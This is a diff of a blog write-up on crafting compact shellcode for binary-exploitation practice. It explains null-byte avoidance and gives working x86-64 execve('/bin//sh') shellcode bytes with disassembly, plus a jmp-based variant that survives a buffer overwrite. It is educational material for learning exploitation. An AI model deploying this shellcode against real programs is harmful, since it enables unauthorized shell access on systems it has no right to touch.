@@ -2,24 +2,24 @@
 title: "Shellcode Snippets: From Bytes to Bash"
 date: 2025-11-02 15:10:00 +0000
 categories: [Writeups, Binex]
-tags: [binex, shellcode]
+tags: [binex, shellcode, syscalls]
 description: "Learning to craft effective shellcode through creativity."
 ---
 ## Introduction
-While learning to craft Shellcode, I have found that I sometimes find myself relating to some of the most famous artists.
+Writing shellcode often feels more like careful problem-solving than dramatic invention. You work inside tight constraints—limited bytes, no libraries, direct syscalls—so creativity shows up in practical choices: which registers to use, how to build arguments on the stack, and how to keep the payload small and reliable.
 
+While learning to craft shellcode, I sometimes catch myself comparing the process to the work of artists—not because it’s glamorous, but because both require iteration, restraint, and a willingness to try unusual approaches until something functional emerges. Jokingly, my shellcode is more Dürer’s Head of a Bearded Child than da Vinci’s Mona Lisa. In this post, I’ll walk through a few compact examples and explain the small design decisions that make them work.
 
 ## Usage
 Shellcode will primarily be placed into a buffer allocated for user input. When crafting our shellcode, it is important to keep it simple and compact since often we will be limited by our buffer sizes. 
 
-One thing we must keep in mind that shell codes has to be simple and
-compact since in real time condition where we have limited space in the
-buffer where we have to insert our shell as we as the return address to it
+One thing we must keep in mind is that shellcode have to be simple and compact since in real-time conditions where we have limited space in the buffer where we have to insert our shell as we as the return address to it
 
 
-## Null-Bytes
-Shellcode is not as simple as programming in raw assembly due to how many C programming language functions handle null-bytes.
-Often times, we will need to use string manipulation functions as a means for getting our shellcode into our running processes. 
+## Avoiding the Blank Canvas (Null-Bytes)
+Writing Shellcode is not always as simple as programming a raw assembly program that executes the execve system call. In fact, many times we will be faced with limitations such as null-bytes that can inhibit the effectiveness of our shellcode. Remeber, since we are going to be inputting our Shellcode in programs that do some sort of string manipulation, we have to account for how many C programming language functions handle null-bytes.
+
+Often, we will need to use string manipulation functions as a means for getting our shellcode into our running processes. 
 
 ```
 
@@ -48,8 +48,31 @@ syscall
 ```
 
 
-## Splitting our Shellcode
+## Making Kinetic Art (Avoiding the Stomp)
+Sometimes we may run into the issue where our shellcode is modified after we supply the code to the user input. One way to prevent this modification is through the use of the jump instruction. For instance, say we know that our shellcode is modified at bytes shellcode[16], shellcode[17], shellcode[18], shellcode[19]. This overwriting of our buffer will modify the shellcode that we provide unless we can "avoid" the alteration.
 
+Original Shellcode
+```
+Python Escaped:
+"\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x54\x6A\x3B\x58\x31\xD2\x0F\x05"
+
+Disassembly:
+31 f6                   xor    esi,esi
+48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
+2f 73 68
+56                      push   rsi
+53                      push   rbx
+54                      push   rsp
+6a 3b                   push   0x3b
+58                      pop    rax
+31 d2                   xor    edx,edx
+0f 05                   syscall
+```
+
+By adding a jmp $+6 we can avoid the alteration that is done to our input, breaking the shellcode. 
+
+#### Placing the jmp
+When determining where to place the jmp instruction, we first need to understand where the alteration of our shellcode begins. When running our code in gdb, we see that we will need to place the jmp instruction after the push rbx. 
 ```
 Python Escaped:
 "\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\xEB\x04\x54\x6A\x3B\x58\x31\xD2\x0F\x05"
@@ -68,18 +91,15 @@ e:  eb 04                   jmp    14 <_main+0x14>
 16: 0f 05                   syscall
 ```
 
+## Helpful Resources
 
-## Templates & Helpful cmds
+| ARCH | NR | RETURN | ARG0 | ARG1 | ARG2	| ARG3 | ARG4	| ARG5 |
+|---|---|---|---|---|---|---|---|---|
+x86 | eax | eax | ebx | ecx | edx | esi | edi | ebp |
+x64	| rax	| rax	| rdi	| rsi	| rdx |	r10 |	r8	| r9 |
 
-rdi -> first arg
-rax -> syscall number
-
-Assemble the object code ```gcc -nostdlib -static -o shellcode-elf shellcode.s```
-
-<br>
-
-Pull out only the shellcode ```objcopy --dump-section .text=shellcode shellcode-elf ```
-<br>
+> [!TIP] 
+> [Helpful Syscall Calling Conventions Resource](https://syscall.sh/)
 
 #### Using pwntools
 ```
@@ -96,10 +116,14 @@ my_sc_bytes = asm(```
 print(disasm(my_sc_bytes))
 
 ```
+#### More Manual Approach to Create Shellcode
+> [!TIP] 
+> Assemble the object code ```gcc -nostdlib -static -o shellcode-elf shellcode.s ```
+> <br>
+> Pull out only the shellcode ```objcopy --dump-section .text=shellcode shellcode-elf ```
+> <br>
+> To view the shellcode, use hexdump.
 
-```
-
-To view the shellcode, use hexdump.
 ```
 .intel_syntax noprefix
 .globl _start
@@ -108,5 +132,8 @@ _start:
   mov rdi, 1337
   syscall
 ```
-[Shellcode/NullFree](https://nets.ec/Shellcode/Null-free) <br>
+
+#### Links
+[Shellcode/NullFree](https://nets.ec/Shellcode/Null-free) 
+<br>
 [pwn.college Shellcode Module](https://pwn.college/dojo/program-security)
